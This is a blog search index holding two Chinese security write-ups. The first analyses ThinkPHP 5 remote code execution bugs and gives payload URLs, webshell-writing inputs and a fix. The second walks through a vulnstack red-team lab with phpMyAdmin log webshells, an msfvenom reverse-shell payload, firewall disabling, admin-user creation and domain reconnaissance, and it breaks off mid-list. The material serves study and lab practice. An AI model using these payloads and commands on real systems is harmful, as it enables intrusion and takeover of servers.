<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TP5 RCE分析</title>
    <link href="/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/"/>
    <url>/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h1><p>参考：<a href="https://www.anquanke.com/post/id/177173#h2-14">https://www.anquanke.com/post/id/177173#h2-14</a></p><p><a href="https://xz.aliyun.com/t/3570#toc-0">https://xz.aliyun.com/t/3570#toc-0</a></p><p><a href="https://xz.aliyun.com/t/7792#toc-0">https://xz.aliyun.com/t/7792#toc-0</a></p><p><a href="https://hack-for.fun/a45.html#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">https://hack-for.fun/a45.html#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93</a></p><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a></p><p><a href="https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ">https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TP 5.0.7 - 5.0.24</span><br><span class="line">TP 5.1.0 - 5.1.30</span><br></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>5.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username // 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    // 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     // 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index|think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami</span><br></pre></td></tr></table></figure><p>5.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;</span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>复现环境 tp 5.1.29+phpstorm+phpstudy+php7.3.9</p><h2 id="下载对应版本的TP"><a href="#下载对应版本的TP" class="headerlink" title="下载对应版本的TP"></a>下载对应版本的TP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=X.X.X TPX.X.X --prefer-dist</span><br><span class="line">下载好后在文件夹内更改composer.json文件</span><br><span class="line">将require更改为</span><br><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;x.x.x&quot;</span><br><span class="line">&#125;</span><br><span class="line">然后composer update</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在App.php的4.2行下断点</p><p>访问<code>http://127.0.0.1/thinkphp/tp5.1/public/?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306184242.png" alt="屏幕截图 2021-03-06 183421"></p><p>进入routeCheck()，进入path()方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306184311.png" alt="屏幕截图 2021-03-06 183439"></p><p>进入pathinfo()方法，根据我们不同的请求方法会使用不同方法获取url的信息</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306184340.png" alt="屏幕截图 2021-03-06 183454"></p><p>最终获取的信息就是<code>index/\think\Request/input</code></p><p>接下来判断是否为强制路由，如是则后面报错退出</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306185527.png" alt="屏幕截图 2021-03-06 183525"></p><p>然后进入check(), 返回一个UrlDispatch的对象， 之后调用的init()方法就是Url.php中的init()方法，最终RouteCheck方法返回一个类</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306185621.png" alt="屏幕截图 2021-03-06 183548"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306185956.png" alt="屏幕截图 2021-03-06 183609"></p><p>之后进入init()方法中</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306190003.png" alt="屏幕截图 2021-03-06 183636"></p><p>进入parseUrl()方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306190520.png" alt="屏幕截图 2021-03-06 183833"></p><p>进入parseUrl()方法，该方法将访问的url信息拆分为 module，controller，action</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306190605.png" alt="屏幕截图 2021-03-06 183859"></p><p>然后传入module类，此时的result为 ，进入module类后 对模块等参数进行验证</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306191249.png" alt="屏幕截图 2021-03-06 191202"></p><p>然后一路执行到</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306195135.png" alt="屏幕截图 2021-03-06 195122"></p><p>这里先创建一个闭包函数，传入add()方法，然后将闭包函数作为中间件存入<code>$this-&gt;queue[$type][] = $middleware;</code></p><p>然后进入dispatch()方法，使用回调函数调用resolve()方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306195407.png" alt="屏幕截图 2021-03-06 183936"></p><p>进入resolve()方法<code>$middleware = array_shift($this-&gt;queue[$type]);</code>将之前的闭包函数赋值给</p><p><code>$middleware</code>，到下面的call_func_array调用之前的闭包函数</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306200123.png" alt="屏幕截图 2021-03-06 200115"></p><p>执行Dispatch类的run()方法<img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306200448.png" alt="屏幕截图 2021-03-06 200436"></p><p>进入到module类的exec()方法，直到利用反射机制 实现rce</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306201226.png" alt="屏幕截图 2021-03-06 201210"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入shell </span><br><span class="line">?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210306203038.png" alt="屏幕截图 2021-03-06 203026"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>在module类中增加对控制器合法性的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line"><span class="variable">$convert</span> = is_bool(<span class="keyword">$this</span>-&gt;convert) ? <span class="keyword">$this</span>-&gt;convert : <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_convert&#x27;</span>);</span><br><span class="line"><span class="comment">// 获取控制器名</span></span><br><span class="line"><span class="variable">$controller</span>       = strip_tags(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;default_controller&#x27;</span>));</span><br><span class="line"><span class="variable">$controller</span> = strip_tags(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;default_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^[A-Za-z](\w)*$/&#x27;</span>, <span class="variable">$controller</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$controller</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;controller = <span class="variable">$convert</span> ? strtolower(<span class="variable">$controller</span>) : <span class="variable">$controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取操作名</span></span><br></pre></td></tr></table></figure><h1 id="RCE2"><a href="#RCE2" class="headerlink" title="RCE2"></a>RCE2</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.0.0 - 5.0.10</span><br></pre></td></tr></table></figure><p>复现环境 phpstorm+phpstudy+php7.3.9</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/tp5.0.10/public/index.php/Index/Test/test?username=%0d%0a@eval($_GET[_]);//</span><br></pre></td></tr></table></figure><p>创建demo，在<code>application\index\controller</code>下创建Test.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成了php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000s:24:&quot;</span><br><span class="line">@eval($_GET[_]);//&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在入口处下断点</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210307220953.png" alt="屏幕截图 2021-03-07 220431"></p><p>进入Cache类的set方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210307221317.png" alt="屏幕截图 2021-03-07 220451"></p><p>进入init()方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210307221422.png" alt="屏幕截图 2021-03-07 220621"></p><p>进入connect()方法，获取<code>$options</code>，最终返回的<code>self::$instance[$name]</code>是file类的实例化</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210308195038.png" alt="屏幕截图 2021-03-08 194938"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210308195905.png" alt="屏幕截图 2021-03-08 195844"></p><p>退出后进入file类的set()方法，然后进入getCacheKey()方法，在这将变量<code>$name</code>的值进行md5加密，将前两位作为文件夹名，后面的几位作为文件名，而<code>$name</code>的值就是在开始创建文件中的name</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210308193812.png" alt="屏幕截图 2021-03-08 193739"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210308200259.png" alt="屏幕截图 2021-03-08 200249"></p><p>返回set()方法，将url中的数据与<code>\r\n@eval($_GET[_]);//</code>拼接，存入文件中</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210308193841.png" alt="屏幕截图 2021-03-08 193725"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">5.0-5.0.23  开起debug无论在完整版还是非完整版都会触发</span><br><span class="line">5.0-5.0.12  不需要?s=captcha</span><br><span class="line">5.0.0 5.0.5 5.0.10 5.0.12 这几个版本测试无论在什么情况下都会触发 非完整版 不开启debug，一部分原因是较低版本默认开启debug 但是关闭debug还是会触发</span><br><span class="line">5.0.22 等等版本则需要使用完整版或者开启debug  并且加上?s=captcha</span><br></pre></td></tr></table></figure><p>复现环境 phpstorm+phpstudy+php5.5.9+tp5.0.22完整版</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/tp5.0.23w/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami （几乎所有版本都通用的payload）</span><br><span class="line"></span><br><span class="line">windows下写入shell </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=powershell -c &quot;echo &#x27;&lt;?php eval($_GET[123]);?&gt;&#x27; &quot; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>request方法，由于表单请求类型伪装变量为<code>_method</code>,只需要post一个<code>_method</code>变量就可以然后指定其值就能调用任意方法，其中<code>$this-&gt;&#123;$this-&gt;method&#125;($_POST);</code>中的参数都是可控的，当动态调用<code>__construct</code>时。</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222034.png" alt="屏幕截图 2021-03-15 215321"></p><p><code>$options</code>也是可控的，通过该方法<code>filter</code>、<code>method</code>、<code>get</code>的值</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222322.png" alt="屏幕截图 2021-03-15 215403"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222537.png" alt="屏幕截图 2021-03-15 215440"></p><p>在request类的param方法中，调用get方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222806.png" alt="屏幕截图 2021-03-15 222640"></p><p>进入get方法，然后进入input方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222833.png" alt="屏幕截图 2021-03-15 222654"></p><p>进入filterValue方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222906.png" alt="屏幕截图 2021-03-15 222901"></p><p>call_user_func函数中的参数都可控，造成代码执行。</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315222959.png" alt="屏幕截图 2021-03-15 222955"></p><h3 id="流程分析1"><a href="#流程分析1" class="headerlink" title="流程分析1"></a>流程分析1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/tp5.0.22w/public/?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p>先进行路由注册，调用了完整核心下的<code>think-captcha/src</code>的helper.php文件，这里的值就会影响<code>self::$rules</code>的值</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315223832.png" alt="屏幕截图 2021-03-15 223138"></p><p>进入app.php，进入routecheck方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224114.png" alt="屏幕截图 2021-03-15 223211"></p><p>进入check方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224135.png" alt="屏幕截图 2021-03-15 223226"></p><p>在check方法中调用method方法，然后动态调用<code>__construct</code>方法，然后对变量进行覆盖</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224231.png" alt="屏幕截图 2021-03-15 223239"></p><p>接着将之前路由注册时的值赋值给<code>$rules</code>，接着一路返回到app类，将值赋值给<code>$dispatch</code></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224621.png" alt="屏幕截图 2021-03-15 223513"></p><p>进入exec方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224700.png" alt="屏幕截图 2021-03-15 224655"></p><p>调用param方法，由于<code>$dispatch[&quot;type&quot;]</code>为method，进入method分支</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224750.png" alt="屏幕截图 2021-03-15 223533"></p><p>进入get方法，进入input方法，然后进入getfilter方法，将之前method覆盖的值赋值给<code>$filter</code>变量，然后进入filterValue方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315224908.png" alt="屏幕截图 2021-03-15 223616"></p><p>调用call_user_func方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315225127.png"></p><p>流程就完成了，造成命令执行</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315225234.png" alt="屏幕截图 2021-03-15 223759"></p><h3 id="流程分析2"><a href="#流程分析2" class="headerlink" title="流程分析2"></a>流程分析2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/tp5.0.22w/public/?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>前面的流程还是一样的，在param方法中，进入method方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234002.png" alt="屏幕截图 2021-03-15 233707"></p><p>由于<code>$this-&gt;method(true)</code>为true，进入server方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234036.png" alt="屏幕截图 2021-03-15 233723"></p><p>进入input方法</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234213.png" alt="屏幕截图 2021-03-15 233737"></p><p>在input方法中获取传入的值<code>whoami</code></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234226.png" alt="屏幕截图 2021-03-15 233804"></p><p>在getfilter中作用相同，将system赋值给$filter</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234325.png" alt="屏幕截图 2021-03-15 233840"></p><p>进入filtervalue中。由于call_user_func的两个变量都为传入的值，可以直接造成命令执行</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234333.png" alt="屏幕截图 2021-03-15 233851"></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20210315234336.png" alt="屏幕截图 2021-03-15 233903"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack 红队一</title>
    <link href="/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/"/>
    <url>/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>配置网卡</p><blockquote><p>编辑-&gt;虚拟网络编辑器</p></blockquote><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212181704.png" alt="QQ截图20201212181654"></p><p>自定义为仅主机模式</p><p>配置win7网络</p><p>添加两块网卡,一块为VMnet1(仅主机模式),一块为VMnet8(net模式连通外网)</p><p>配置VMnet1网卡 (win7)</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182040.png" alt="QQ截图20201212182018"></p><p>DNS服务器是windows server的ip, vulnstack配置好了</p><p>使用win7 ping一下 windows server, 能ping同则成功</p><p>配置好后加入域</p><blockquote><p>控制面板-&gt;系统安全-&gt;系统-&gt;高级系统设置,  加入域时会提示已有域用户,登录即可.</p></blockquote><p>此时kali win7都使用VMnet8 都处于同一网段下, 都可访问外网</p><p>kali</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183004.png" alt="QQ截图20201212182930"></p><p>win7</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182939.png" alt="QQ截图20201212182900"></p><h1 id="拿下win7"><a href="#拿下win7" class="headerlink" title="拿下win7"></a>拿下win7</h1><blockquote><p>如果访问不了网站可能是防火墙的原因, 将apache mysql的程序全部允许通过防火墙即可</p></blockquote><p>目录扫描</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183757.png" alt="QQ截图20201212183749"></p><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>弱口令弱口令登录(root root)</p><ol><li><p>日志拿shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看日志状况 show variables like &quot;%log%&quot;</span><br><span class="line">开启日志 set global general_log=&#x27;on&#x27;</span><br><span class="line">修改日志路径 set global general_log_file=&#x27;C:\\phpStudy\\WWW\\test2.php&#x27;</span><br><span class="line">查看开启情况 show variables like &quot;general_log%&quot;</span><br><span class="line"></span><br><span class="line">写入shell</span><br><span class="line">select &quot;&lt;?php eval($_POST[123]);?&gt;&quot;</span><br></pre></td></tr></table></figure></li><li><p>yxcms</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现备份文件, 是yxcms 版本 1.2.1</span><br></pre></td></tr></table></figure></li></ol><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问index.php?r=admin登录后台</span><br><span class="line">admin 123456</span><br><span class="line"></span><br><span class="line">在前台模板 index_index.php中插入一句话</span><br><span class="line"></span><br><span class="line">访问http://192.168.137.129/yxcms/即可getshell</span><br></pre></td></tr></table></figure><h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="建立shell"><a href="#建立shell" class="headerlink" title="建立shell"></a>建立shell</h2><ol><li><p>msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成windows x64木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=12345 -f exe -o hack.exe</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181346.png" alt="QQ截图20201213180407"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">建立监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">注意对应x64</span><br><span class="line">set LHOST 目标机ip</span><br><span class="line">set LPORT 12345</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181451.png" alt="QQ截图20201213181446"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在蚁剑中执行 start hack.exe</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181505.png" alt="QQ截图20201213180336"></p><ol><li>进程迁移</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当执行hack.exe后进程是十分容易被发现的</span><br><span class="line">migrate -N explorer.exe  迁移到任务管理器中</span><br><span class="line">原先的hack.exe进程也会消失</span><br><span class="line"></span><br><span class="line">设置反弹shell后自动迁移</span><br><span class="line">set autorunscript migrate -N explorer.exe</span><br><span class="line">或者</span><br><span class="line">set autorunscript migrate -f (默认迁移到记事本)</span><br></pre></td></tr></table></figure><h2 id="开启远程登录"><a href="#开启远程登录" class="headerlink" title="开启远程登录"></a>开启远程登录</h2><p>关闭防火墙</p><p><code>输入shell进入windows的cmd</code></p><p>如果有乱码, 可以输入<code>chcp 65001</code>(65001就是utf-8, 将cmd的编码和kali统一)</p><p>查看防火墙状态</p><p><code>netsh firewall show state</code></p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213185854.png" alt="QQ截图20201213185542"></p><p>​    关闭防火墙</p><p>​    <code>netsh firewall set opmode disable </code></p><p>​    开启3389端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不知道为啥 kali上反弹的shell不能执行这个命令, 只能使用蚁剑执行</span><br><span class="line">REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>​    添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test 123root! /add</span><br><span class="line">net localgroup administrators test /add</span><br></pre></td></tr></table></figure><p>​    远程登录</p><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213211741.png" alt="QQ截图20201213211727"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 查询ip 域信息</span><br><span class="line">systeminfo 查询系统信息</span><br><span class="line">net config Workstation 查询计算机信息, 域信息</span><br><span class="line">net user 本机用户</span><br><span class="line">net user /domain 查询域用户</span><br><span class="line">net view /domain:god god是域名, 查看域主机名</span><br><span class="line">net user test /domain 查询域内test用户</span><br><span class="line">net user /domain test 123 修改test用户密码为123</span><br><span class="line">net group /domain 查询域工作组</span><br><span class="line">net group 组名 /domain 查询域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查询域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain 查看域控制器</span><br><span class="line">tasklist 查询进程 是否有杀毒软件之类的</span><br><span 